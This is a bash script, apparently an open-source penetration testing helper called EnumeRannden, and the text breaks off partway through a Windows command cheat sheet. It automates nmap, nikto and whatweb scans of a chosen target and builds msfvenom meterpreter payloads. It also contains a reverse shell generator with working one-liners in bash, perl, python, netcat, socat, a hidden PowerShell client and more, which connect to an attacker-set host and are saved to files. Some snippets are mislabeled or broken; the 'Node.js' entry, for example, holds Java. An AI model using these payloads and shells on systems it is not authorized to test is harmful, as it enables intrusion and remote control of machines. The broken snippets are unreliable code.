#!/bin/bash

# Line edition and moving using arrows
set -o vi

# Save the commands history in a file
HISTFILE=~/.bash_history
HISTSIZE=1000
HISTFILESIZE=2000

# Load the commands history
history -r

# Save the commands history on exit
trap 'history -a' EXIT

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
VIOLET='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m' # No Color

# Global Variables
IP=""
OS=""
OPEN_PORTS=""
BASE_DIR=""
ENUM_DIR=""
EXPLOITS_DIR=""
CREATE_FILES=""
# FILE_PATH="/home/kali/Documents/plantilla.txt"
last_output=""
hora=$(date +"%m-%d-%H:%M")

# Function to show the banner
show_banner() {
colors=($GREEN $RED $BLUE $YELLOW $VIOLET $CYAN $WHITE)
    text=(
    "#################################################################################################################################################"
    "#                                                                                                                                               #"
    "#  :::::::::: ::::    ::: :::    ::: ::::    ::::  :::::::::: :::::::::      :::     ::::    ::: ::::    ::: :::::::::  :::::::::: ::::    :::  #"
	"#  :+:        :+:+:   :+: :+:    :+: +:+:+: :+:+:+ :+:        :+:    :+:   :+: :+:   :+:+:   :+: :+:+:   :+: :+:    :+: :+:        :+:+:   :+:  #"
	"#  +:+        :+:+:+  +:+ +:+    +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  +:+   +:+  :+:+:+  +:+ :+:+:+  +:+ +:+    +:+ +:+        :+:+:+  +:+  #"
	"#  +#++:++#   +#+ +:+ +#+ +#+    +:+ +#+  +:+  +#+ +#++:++#   +#++:++#:  +#++:++#++: +#+ +:+ +#+ +#+ +:+ +#+ +#+    +:+ +#++:++#   +#+ +:+ +#+  #"
	"#  +#+        +#+  +#+#+# +#+    +#+ +#+       +#+ +#+        +#+    +#+ +#+     +#+ +#+  +#+#+# +#+  +#+#+# +#+    +#+ +#+        +#+  +#+#+#  #"
	"#  #+#        #+#   #+#+# #+#    #+# #+#       #+# #+#        #+#    #+# #+#     #+# #+#   #+#+# #+#   #+#+# #+#    #+# #+#        #+#   #+#+#  #"
	"#  ########## ###    ####  ########  ###       ### ########## ###    ### ###     ### ###    #### ###    #### #########  ########## ###    ####  #"
    "#                                                                                                                                               #"
    "#                                                                                                                                               #"                                                                                                                                               #"
    "#                                                          Created by: Rannden-SHA                                                              #"
    "#                                                  GitHub: https://github.com/Rannden-SHA/                                                      #"
    "#                                                                                                                                               #"
    "#################################################################################################################################################"

)

for i in {1..20}; do
        clear
        color=${colors[$i % ${#colors[@]}]}
        echo -e "${color}"
        for line in "${text[@]}"; do
            echo "$line"
        done
        echo -e "${NC}"
        sleep 0.1
    done
}

# Function to display the information panel
show_info_panel() {
    echo -e "${VIOLET}"
    echo "========================================================"
    echo -e "${YELLOW}                    Information Panel${NC}"
    echo ""
    echo -e "${YELLOW}My IP:${NC} $(hostname -I | awk '{print $1}') | $(hostname -I | awk '{print $2}')${RED}${NC}"
    echo -e "${YELLOW}My System:${NC} $(uname -s) | $(uname -r) | $(uname -m)${NC}"
    echo -e "${VIOLET}   --------------------------------------------------${NC}"
    echo -e "${YELLOW}Configured IP:${NC}${RED} ${IP}${NC}"
    echo -e "${YELLOW}Host's Operating System:${NC} ${RED}${OS}${NC}"
    echo -e "${YELLOW}Open Ports:${NC}${RED} ${OPEN_PORTS}${NC}"
    echo -e "${YELLOW}Main Directory:${NC}${RED} ${BASE_DIR}${NC}"
    echo -e "${VIOLET}"
    echo "========================================================"
    echo -e "${NC}"
}

# Function to show help
show_help() {
    echo -e "${BLUE}Usage: $0 [options]${NC}"
    echo
    echo "Options:"
    echo -e "  -c [file.conf]\tLoad a configuration file."
    echo -e "  -h\t\t\tShow this help."
    echo
    echo "Description:"
    echo "  This script automates various tasks for penetration testing and reconnaissance."
    echo
    echo "  Options:"
    echo -e "  1) Configure IP:"
    echo "     Set the target host IP and detect its operating system."
    echo
    echo -e "  2) Create directories:"
    echo "     Create the main working directory and its subdirectories."
    echo
    echo -e "  3) NMAP scans:"
    echo "     Perform different types of NMAP scans to enumerate open ports and services."
    echo
    echo -e "  4) Web Tools:"
    echo "     Use tools like WhatWeb, Nikto, and Gobuster for web service enumeration."
    echo
    echo -e "  5) OSINT Tools:"
    echo "     Use tools like theHarvester, Spiderfoot, and FinalRecon for open source intelligence gathering."
    echo
    echo -e "  6) Exploit Tools:"
    echo "     Generate payloads and search for exploits using Searchsploit."
    echo
    echo -e "  7) CheatSheets:"
    echo "     Display various cheat sheets for Linux commands, Windows commands, pivoting, and file transfer techniques."
    echo
    echo -e "  8) Hash Crack:"
    echo "     Detect hash types and crack hashes using Hashcat."
    echo
    echo -e "  9) Reverse Shell Generator:"
    echo "     Generate reverse shell commands for various programming languages and tools."
    echo
    echo -e "  10) Generate Report:"
    echo "     Save the results of the enumeration and scanning to a report file."
    echo
    echo -e "  11) Check and Install Dependencies:"
    echo "     Check for and install necessary dependencies for the script."
    echo
    echo -e "  12) Save & Exit:"
    echo "     Save the current configuration and exit the script."
    echo
    echo "  This script also supports loading a configuration file with the '-c' option to restore a previous session."
    echo
    echo "Example:"
    echo -e "  $0 -c previous_session.conf"
    echo
    echo
    echo -e "${BLUE}[+] Thanks for use ${VIOLET}EnumeRannden${BLUE}!${NC}"
}

# IP setting function
set_ip() {
    show_info_panel
    read -e -p "Enter the Target IP or URL: " IP
    OPEN_PORTS="" # Clear OPEN_PORTS whenever IP is set
    clear
    detect_os
}

# Function to detect the operating system
detect_os() {
    if [ -z "$IP" ]; then
        echo -e "${RED}[-] No IP configured.${NC}"
        return
    fi

    echo -e "${BLUE}[+] Pinging to ${IP}${NC}"
    TTL=$(ping -c 1 $IP | grep 'ttl' | awk -F'ttl=' '{print $2}' | awk '{print $1}')

    if [ ! -z "$TTL" ]; then
        if [ "$TTL" -le 70 ]; then
            OS="Linux --> TTL=$TTL"
        else
            OS="Windows --> TTL=$TTL"
        fi
    else
        OS="Unknown"
        echo -e "${RED}[-] TTL could not be determined.${NC}"
    fi
}

# Function to create directories
create_directories() {

    show_info_panel
    read -e -p "Enter the name of the main directory: " BASE_DIR
    ENUM_DIR="$BASE_DIR/enum"
    EXPLOITS_DIR="$ENUM_DIR/exploits"
    clear

    echo -e "${BLUE}[+] Creating main directory: ${BASE_DIR}${NC}"
    mkdir -p "$BASE_DIR"

    echo -e "${BLUE}[+] Creating subdirectories: enum, loot, privesc, exploits, osint and tools${NC}"
    mkdir -p "$BASE_DIR/enum" "$BASE_DIR/loot" "$BASE_DIR/privesc" "$BASE_DIR/exploits" "$BASE_DIR/osint" "$BASE_DIR/tools"
    # Copy file
    #if [ -f "$FILE_PATH" ]; then
       #echo -e "${BLUE}[+] Copying ${FILE_PATH} to ${ENUM_DIR}${NC}"
       #cp "$FILE_PATH" "$ENUM_DIR"
    #else
        #echo -e "${RED}[-] The file ${FILE_PATH} doesn't exists.${NC}"
    #fi
}

# Function to scan ports with NMAP
scan_nmap() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select the nmap scan type:${NC}"
        echo -e "1) AutoEnumeration"
        echo -e "2) Simple port scanning"
        echo -e "3) Scanning with port version"
        echo -e "4) Custom nmap scan"
        echo -e "5) Back"
        read -e -p "Option: " nmap_option

        clear
        case $nmap_option in
            1)
                echo -e "${BLUE}[+] Performing autonmap scan.${NC}"
                nmap -p- --open --min-rate 5000 -Pn $IP -oN "$ENUM_DIR/nmap_open_ports.txt"
                update_ports
                echo -e "${BLUE}[+] Checking for open HTTP/HTTPS ports in nmap scan results.${NC}"
                open_http_ports=$(grep -E '^[0-9]+/(tcp|udp) +open +(http|https)' "$ENUM_DIR/nmap_open_ports.txt" | awk '{print $1}' | awk -F'/' '{print $1}')

                if [ ! -z "$open_http_ports" ]; then
                    last_output=""
                    for port in $open_http_ports; do
                        if [ "$port" == "443" ] || [ "$port" == "https" ]; then
                            echo -e "${GREEN}[+] Performing Whatweb scan on https://${IP}:${port}${NC}"
                            whatweb https://${IP}:${port} > "$ENUM_DIR/whatweb_$port.txt"
                        else
                            echo -e "${GREEN}[+] Performing Whatweb scan on http://${IP}:${port}${NC}"
                            whatweb http://${IP}:${port} > "$ENUM_DIR/whatweb_$port.txt"
                        fi
                        last_output+=$(cat "$ENUM_DIR/whatweb_$port.txt")
                        cat "$ENUM_DIR/whatweb_$port.txt"
                        last_output+=$'\n'
                        echo -e "${GREEN}[+] Performing Nikto scan on ${IP}:${port}${NC}"
                        nikto -h $IP:$port | tee "$ENUM_DIR/nikto_$port.txt"
                        last_output+=$(cat "$ENUM_DIR/nikto_$port.txt")
                        cat "$ENUM_DIR/nikto_$port.txt"
                        last_output+=$'\n'
                    done
                else
                    last_output="${RED}[+] No open HTTP/HTTPS ports found.${NC}"
                fi
                save_results
                ;;
            2)
                echo -e "${BLUE}[+] Performing port scanning with nmap.${NC}"
                nmap -p- --open --min-rate 5000 -Pn $IP -oN "$ENUM_DIR/nmap_open_ports.txt"
                update_ports
                last_output=$(cat "$ENUM_DIR/nmap_open_ports.txt")
                save_results
                ;;
            3)
                echo -e "${BLUE}[+] Select the range of ports (1-1000), specific ports separated by commas (80,443,445) or 'all' to scan all ports:${NC}"
                read -e -p "Ports: " port_range
                if [ "$port_range" == "all" ]; then
                    specific_ports="-p-"
                else
                    specific_ports="-p $port_range"
                fi
                echo -e "${BLUE}[+] Performing port version scanning with nmap.${NC}"
                nmap $specific_ports -sCV --open -T4 -Pn $IP -oN "$ENUM_DIR/nmap_info_ports.txt"
                update_ports
                last_output=$(cat "$ENUM_DIR/nmap_info_ports.txt")
                save_results
                ;;
            4)
                echo -e "${BLUE}[+] Custom Scan Settings:${NC}"
                read -e -p "Enter the ports to scan (example: 1-100 o 80,443 o todos): " ports
                read -e -p "You want to detect the version of the service -sV (y/n): " service_version
                read -e -p "You want to perform a script scan -sC (y/n): " script_scan
                read -e -p "You want to perform an aggressive scan -A (y/n): " aggressive_scan
                read -e -p "You want to perform a UDP scan -sU (y/n): " udp_scan
                read -e -p "Enter the intensity level -T (0-5, default is 3): " intensity
                read -e -p "You want to scan without ping -Pn (y/n): " no_ping
                read -e -p "You want to scan behind firewall -f (y/n): " firewall_scan
                read -e -p "You want to perform a quick scan -F (y/n): " fast_scan

                custom_options=""
                if [ "$ports" == "all" ]; then
                    custom_options="-p-"
                else
                    custom_options="-p $ports"
                fi
                if [ "$service_version" == "y" ]; then
                    custom_options="$custom_options -sV"
                fi
                if [ "$script_scan" == "y" ]; then
                    custom_options="$custom_options -sC"
                fi
                if [ "$aggressive_scan" == "y" ]; then
                    custom_options="$custom_options -A"
                fi
                if [ "$udp_scan" == "y" ]; then
                    custom_options="$custom_options -sU"
                fi
                if [ -n "$intensity" ]; then
                    custom_options="$custom_options -T$intensity"
                fi
                if [ "$no_ping" == "y" ]; then
                    custom_options="$custom_options -Pn"
                fi
                if [ "$firewall_scan" == "y" ]; then
                    custom_options="$custom_options -f"
                fi
                if [ "$fast_scan" == "y" ]; then
                    custom_options="$custom_options -F"
                fi

                echo -e "${BLUE}[+] Performing custom port scanning with nmap.${NC}"
                nmap $custom_options $IP --open -oN "$ENUM_DIR/nmap_custom_scan.txt"
                update_ports
                last_output=$(cat "$ENUM_DIR/nmap_custom_scan.txt")
                save_results
                ;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to update open ports
update_ports() {
    if [ -f "$ENUM_DIR/nmap_open_ports.txt" ]; then
        OPEN_PORTS=$(grep -E '^[0-9]+/(tcp|udp) +open' "$ENUM_DIR/nmap_open_ports.txt" | awk '{print $1}' | awk -F'/' '{print $1}' | tr '\n' ' ')
    elif [ -f "$ENUM_DIR/nmap_info_ports.txt" ]; then
        OPEN_PORTS=$(grep -E '^[0-9]+/(tcp|udp) +open' "$ENUM_DIR/nmap_info_ports.txt" | awk '{print $1}' | awk -F'/' '{print $1}' | tr '\n' ' ')
    elif [ -f "$ENUM_DIR/nmap_custom_scan.txt" ]; then
        OPEN_PORTS=$(grep -E '^[0-9]+/(tcp|udp) +open' "$ENUM_DIR/nmap_custom_scan.txt" | awk '{print $1}' | awk -F'/' '{print $1}' | tr '\n' ' ')
    else
        OPEN_PORTS=""
        echo -e "${RED}[-] No nmap scan files found with open ports.${NC}"
    fi
}

# Function to save results in configuration file
save_results() {
    if [ -z "$BASE_DIR" ]; then
        echo -e "${YELLOW}[!!] Thanks for use ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
        return 1
    fi

    conf_file="${BASE_DIR}/${BASE_DIR##*/}.conf"
    {
        echo "IP=${IP}"
        echo "OS=${OS}"
        echo "OPEN_PORTS=${OPEN_PORTS}"
        echo "BASE_DIR=${BASE_DIR}"
    } > "$conf_file"
    echo -e "${BLUE}[+] Results saved in ${conf_file}${NC}"
    echo -e "${YELLOW}[!!] Thanks for use ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
}

# Function to save results in a report
save_report() {
    if [ -z "$BASE_DIR" ]; then
        echo -e "${YELLOW}[!!] Thanks for using ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
        return 1
    fi

    report_file="${BASE_DIR}/report_${BASE_DIR##*/}.txt"
    {
        echo -e "${CYAN}"
        echo "                                 ========================================================"
        echo "                                                     Information Panel"
        echo "                                 ========================================================"
        echo -e "${NC}"
        echo -e "${BLUE}                                   IP:${NC} ${RED}${IP}${NC}"
        echo -e "${BLUE}                                   Host's Operating System:${NC} ${RED}${OS}${NC}"
        echo -e "${BLUE}                                   Open Ports:${NC} ${RED}${OPEN_PORTS}${NC}"
        echo -e "${BLUE}                                   Main Directory:${NC} ${RED}${BASE_DIR}${NC}"
        echo -e "${CYAN}"
        echo "                                 ========================================================"
        echo -e "${NC}\n\n"
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"
        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                      NMAP Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${ENUM_DIR}/nmap_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                     WhatWeb Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${ENUM_DIR}/whatweb_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                     Nikto Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${ENUM_DIR}/nikto_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                    Gobuster Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        [ -e "${ENUM_DIR}/gobuster.txt" ] && echo -e "${YELLOW}File: ${ENUM_DIR}/gobuster.txt${NC}\n$(cat "${ENUM_DIR}/gobuster.txt")\n"
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                  Hash Cracking Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${BASE_DIR}/loot/cracked_"*.txt; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                   Payloads Generated"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${BASE_DIR}/exploits/"*; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"

        echo -e "${GREEN}"
        echo "                                         ====================================="
        echo "                                                     OSINT Results"
        echo "                                         ====================================="
        echo -e "${NC}\n"
        for file in "${BASE_DIR}/osint/"*; do
            [ -e "$file" ] && echo -e "${YELLOW}File: ${file}${NC}\n$(cat "$file")\n"
        done
        echo -e "${CYAN}----------------------------------------------------------------------------------------------------------${NC}\n\n"
    } > "$report_file"

    echo -e "${BLUE}[+] Report saved in ${report_file}${NC}"
}

# Function to load results from configuration file
load_results() {
    if [ -f "$1" ]; then
        while IFS='=' read -r key value; do
            case "$key" in
                'IP') IP="$value" ;;
                'OS') OS="$value" ;;
                'OPEN_PORTS') OPEN_PORTS="$value" ;;
                'BASE_DIR') BASE_DIR="$value" ;;
            esac
        done < "$1"
        echo -e "${BLUE}[+] Results uploaded from $1${NC}"
        ENUM_DIR="$BASE_DIR/enum"
    else
        echo -e "${RED}[-] File $1 does not exist.${NC}"
    fi
}

# Function to generate payloads using msfvenom
generate_payloads() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an option to generate payloads:${NC}"
        echo -e "1) windows/meterpreter/reverse_tcp"
        echo -e "2) windows/x64/meterpreter/reverse_tcp"
        echo -e "3) linux/x86/meterpreter/reverse_tcp"
        echo -e "4) linux/x64/meterpreter/reverse_tcp"
        echo -e "5) osx/x86/shell_reverse_tcp"
        echo -e "6) osx/x64/shell_reverse_tcp"
        echo -e "7) android/meterpreter/reverse_tcp"
        echo -e "8) java/jsp_shell_reverse_tcp"
        echo -e "9) php/meterpreter_reverse_tcp"
        echo -e "10) python/meterpreter_reverse_tcp"
        echo -e "11) Customize payload"
        echo -e "12) Back"
        read -e -p "Option: " payload_option

        clear
        case $payload_option in
            1)
                payload="windows/meterpreter/reverse_tcp"
                format="exe"
                ;;
            2)
                payload="windows/x64/meterpreter/reverse_tcp"
                format="exe"
                ;;
            3)
                payload="linux/x86/meterpreter/reverse_tcp"
                format="elf"
                ;;
            4)
                payload="linux/x64/meterpreter/reverse_tcp"
                format="elf"
                ;;
            5)
                payload="osx/x86/shell_reverse_tcp"
                format="macho"
                ;;
            6)
                payload="osx/x64/shell_reverse_tcp"
                format="macho"
                ;;
            7)
                payload="android/meterpreter/reverse_tcp"
                format="apk"
                ;;
            8)
                payload="java/jsp_shell_reverse_tcp"
                format="jsp"
                ;;
            9)
                payload="php/meterpreter_reverse_tcp"
                format="php"
                ;;
            10)
                payload="python/meterpreter_reverse_tcp"
                format="py"
                ;;
            11)
                read -e -p "Enter the custom payload: " payload
                read -e -p "Enter the custom format: " format
                ;;
            12)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                continue
                ;;
        esac

        if [ -n "$payload" ]; then
            show_info_panel
            read -e -p "Enter the IP address for the payload (LHOST): " lhost
            read -e -p "Enter the port for the payload (LPORT): " lport
            read -e -p "Enter the name of the file to save the payload (without extension): " output_file

            output_file="${output_file}.${format}"
            clear
            msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o "${BASE_DIR}/exploits/$output_file"
            echo -e "${BLUE}[+] Payload generated and saved in ${BASE_DIR}/exploits/${output_file}${NC}"
        fi
    done
}

# Function to generate reverse shells
generate_reverse_shell() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Reverse Shell Option:${NC}"
        echo -e "1) Bash"
        echo -e "2) Perl"
        echo -e "3) Python"
        echo -e "4) PHP"
        echo -e "5) Ruby"
        echo -e "6) Netcat"
        echo -e "7) Socat"
        echo -e "8) PowerShell"
        echo -e "9) C#"
        echo -e "10) Java"
        echo -e "11) Golang"
        echo -e "12) Awk"
        echo -e "13) Telnet"
        echo -e "14) Node.js"
        echo -e "15) Tclsh"
        echo -e "16) Haskell"
        echo -e "17) Back to Main Menu"
        read -e -p "Option: " shell_option

        case $shell_option in
            1)
                shell_code='bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
                ;;
            2)
                shell_code='perl -e "use Socket;$i=\$LHOST;$p=\$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"'
                ;;
            3)
                shell_code='python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",int(\"$LPORT\")));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
                ;;
            4)
                shell_code='php -r "$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");"'
                ;;
            5)
                shell_code='ruby -rsocket -e "f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"'
                ;;
            6)
                shell_code='nc -e /bin/sh $LHOST $LPORT'
                ;;
            7)
                shell_code='socat TCP:$LHOST:$LPORT EXEC:/bin/sh'
                ;;
            8)
                shell_code='powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$LHOST",$LPORT);[byte[]]$buffer=0..65535|%{0};while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'
                ;;
            9)
                shell_code='using System;using System.IO;using System.Net.Sockets;class Program{static void Main(string[] args){using(TcpClient client=new TcpClient("$LHOST",$LPORT)){using(Stream stream=client.GetStream()){using(StreamReader rdr=new StreamReader(stream)){using(StreamWriter wtr=new StreamWriter(stream)){StringBuilder strInput=new StringBuilder();char[] buff=new char[1024];int readBytes=0;while(true){readBytes=rdr.Read(buff,0,buff.Length);strInput.Append(buff,0,readBytes);if(strInput.ToString().EndsWith("EOF")){strInput.Remove(strInput.Length-3,3);break;}}}}}}}'
                ;;
            10)
                shell_code='r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()'
                ;;
            11)
                shell_code='echo "package main\nimport(\n\"net\"\n\"os/exec\"\n)\nfunc main(){\nc,_:=net.Dial(\"tcp\",\"$LHOST:$LPORT\")\ncmd:=exec.Command(\"/bin/sh\")\ncmd.Stdin=c\ncmd.Stdout=c\ncmd.Stderr=c\ncmd.Run()\n}" > /tmp/t.go && go run /tmp/t.go'
                ;;
            12)
                shell_code='awk "BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while (1) { printf \\"sh <&3 >&3 2>&3\\" |& s; s |& getline c; if (c) { while (c) { print c |& s; s |& getline c } close(s); } } }"'
                ;;
            13)
                shell_code='TF=$(mktemp -u);mkfifo $TF && telnet $LHOST $LPORT 0<$TF | /bin/sh 1>$TF'
                ;;
            14)
                shell_code='String host="$LHOST";int port=$LPORT;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
                ;;
            15)
                shell_code='tclsh <<EOF\nset s [socket $LHOST $LPORT]\nwhile {1} {\n  set line [gets stdin]\n  if {[catch {eval $line} res]} {\n    puts $res\n    flush stdout\n  }\n}\nEOF'
                ;;
            16)
                shell_code='import Network.Socket\nimport System.IO\nimport System.Process\nmain = withSocketsDo $ do\n    h <- connectTo "$LHOST" (PortNumber $LPORT)\n    (Just hin, Just hout, Just herr, p) <- createProcess (proc "/bin/sh" ["-i"]){\n        std_in  = UseHandle h,\n        std_out = UseHandle h,\n        std_err = UseHandle h }\n    waitForProcess p\n'
                ;;
            17)
		        clear
                break
                ;;
            *)
                clear
                echo -e "${RED}[-] Invalid option.${NC}"
                continue
                ;;
        esac

        if [ -n "$shell_code" ]; then
            read -e -p "Enter the IP address (LHOST): " lhost
            read -e -p "Enter the port (LPORT): " lport
            
            plain_shell_code=${shell_code//\$LHOST/$lhost}
            plain_shell_code=${plain_shell_code//\$LPORT/$lport}

            shell_code=${shell_code//\$LHOST/${VIOLET}$lhost${YELLOW}}
            shell_code=${shell_code//\$LPORT/${VIOLET}$lport${YELLOW}}

            echo -e "${GREEN}[+] Reverse Shell:${NC}"
            echo -e "${YELLOW}${shell_code}${NC}"
            
            read -e -p "Do you want to save the reverse shell to a file? (y/n): " save_option
            if [ "$save_option" == "y" ]; then
                read -e -p "Enter the file name (without extension): " output_file
                case $shell_option in
                    1)
                        extension="sh"
                        ;;
                    2)
                        extension="pl"
                        ;;
                    3)
                        extension="py"
                        ;;
                    4)
                        extension="php"
                        ;;
                    5)
                        extension="rb"
                        ;;
                    6)
                        extension="nc"
                        ;;
                    7)
                        extension="sc"
                        ;;
                    8)
                        extension="ps1"
                        ;;
                    9)
                        extension="cs"
                        ;;
                    10)
                        extension="java"
                        ;;
                    11)
                        extension="go"
                        ;;
                    12)
                        extension="awk"
                        ;;
                    13)
                        extension="txt"
                        ;;
                    14)
                        extension="js"
                        ;;
                    15)
                        extension="tcl"
                        ;;
                    16)
                        extension="hs"
                        ;;
                    *)
                        extension="txt"
                        ;;
                esac
                echo "$plain_shell_code" > "${BASE_DIR}/exploits/${output_file}.${extension}"
                echo -e "${GREEN}[+] Reverse shell saved in ${BASE_DIR}/exploits/${output_file}.${extension}${NC}"
		        clear
            fi
			clear        
        fi
    done
}

# Function to show cheatsheets
show_cheatsheets() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Cheatsheet:${NC}"
        echo -e "1) Linux commands"
        echo -e "2) Windows commands"
        echo -e "3) Pivoting"
        echo -e "4) File transfer"
        echo -e "5) Back to Main Menu"
        read -e -p "Option: " cheatsheet_option

        case $cheatsheet_option in
            1)
		            clear
                echo -e "${GREEN}Linux commands:${NC}"
                echo -e "${YELLOW}ls: List files and directories${NC}"
                echo "example: ls -la"
                echo
                echo -e "${YELLOW}cd: Change the current directory${NC}"
                echo "example: cd /home/user"
                echo
                echo -e "${YELLOW}pwd: Shows the current directory${NC}"
                echo "example: pwd"
                echo
                echo -e "${YELLOW}cp: Copy files or directories${NC}"
                echo "example: cp source.txt destination.txt"
                echo
                echo -e "${YELLOW}mv: Move or rename files or directories${NC}"
                echo "example: mv oldname.txt newname.txt"
                echo
                echo -e "${YELLOW}rm: Delete files or directories${NC}"
                echo "example: rm file.txt"
                echo
                echo -e "${YELLOW}mkdir: Create a new directory${NC}"
                echo "example: mkdir new_directory"
                echo
                echo -e "${YELLOW}rmdir: Delete an empty directory${NC}"
                echo "example: rmdir empty_directory"
                echo
                echo -e "${YELLOW}touch: Create an empty file or update a file's timestamp${NC}"
                echo "example: touch newfile.txt"
                echo
                echo -e "${YELLOW}cat: Show the content of a file${NC}"
                echo "example: cat file.txt"
                echo
                echo -e "${YELLOW}nano: Text editor in terminal${NC}"
                echo "example: nano file.txt"
                echo
                echo -e "${YELLOW}chmod: Change the permissions of a file or directory${NC}"
                echo "example: chmod 755 script.sh"
                echo
                echo -e "${YELLOW}chown: Change the owner of a file or directory${NC}"
                echo "example: chown user:group file.txt"
                echo
                echo -e "${YELLOW}grep: Search text within files${NC}"
                echo "example: grep 'search_term' file.txt"
                echo
                echo -e "${YELLOW}find: Searches files and directories in the file system${NC}"
                echo "example: find /path -name filename"
                echo
                echo -e "${YELLOW}awk: Process and analyze text${NC}"
                echo "example: awk '{print \$1}' file.txt"
                echo
                echo -e "${YELLOW}sed: Flow text editor${NC}"
                echo "example: sed 's/old/new/g' file.txt"
                echo
                echo -e "${YELLOW}tar: Archive files and directories${NC}"
                echo "example: tar -cvf archive.tar directory"
                echo
                echo -e "${YELLOW}gzip: Compress files${NC}"
                echo "example: gzip file.txt"
                echo
                echo -e "${YELLOW}gunzip: Unzip files${NC}"
                echo "example: gunzip file.txt.gz"
                echo
                echo -e "${YELLOW}rsync: Synchronize files and directories${NC}"
                echo "example: rsync -avz source/ destination/"
                echo
                echo -e "${YELLOW}iptables: Configure firewall rules${NC}"
                echo "example: iptables -A INPUT -p tcp --dport 22 -j ACCEPT"
                echo
                echo -e "${YELLOW}netstat: Shows network connections, routing tables, and interface statistics${NC}"
                echo "example: netstat -tuln"
                echo
                echo -e "${YELLOW}top: Shows running processes and system usage in real time${NC}"
                echo "example: top"
                echo
                echo -e "${YELLOW}htop: Improved version of top${NC}"
                echo "example: htop"
                echo
                ;;
            2)
		            clear
                echo -e "${GREEN}Windows commands:${NC}"
                echo -e "${YELLOW}dir: List files and directories${NC}"
                echo "example: dir"
                echo
                echo -e "${YELLOW}cd: Change the current directory${NC}"
                echo "example: cd C:\Users\User"
                echo
                echo -e "${YELLOW}cls: Clean the terminal screen${NC}"
                echo "example: cls"
                echo
                echo -e "${YELLOW}copy: Copy files${NC}"
                echo "example: copy source.txt destination.txt"
                echo
                echo -e "${YELLOW}move: Move or rename files${NC}"
                echo "example: move oldname.txt newname.txt"
                echo
                echo -e "${YELLOW}del: Delete files${NC}"
                echo "example: del file.txt"
                echo
